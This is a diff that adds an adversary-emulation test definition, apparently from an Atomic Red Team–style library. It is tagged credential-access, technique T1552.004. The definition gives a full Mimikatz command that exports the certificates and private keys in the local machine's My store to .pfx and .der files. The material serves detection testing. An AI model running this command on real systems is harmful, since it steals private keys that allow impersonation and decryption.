@@ -1,0 +1,21 @@
+- description: 'The following Atomic test will utilize Mimikatz to extract the certificates
+    from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz
+    and can be obtained using the get-prereq_commands.
+
+    A successful attempt will stdout the certificates and write multiple .pfx and
+    .der files to disk.
+
+    '
+  id: fd3ee5ac9978245dae1e7563a1c6b13d
+  name: Export Certificates with Mimikatz
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe "crypto::certificates
+          /systemstore:local_machine /store:my /export"  exit
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
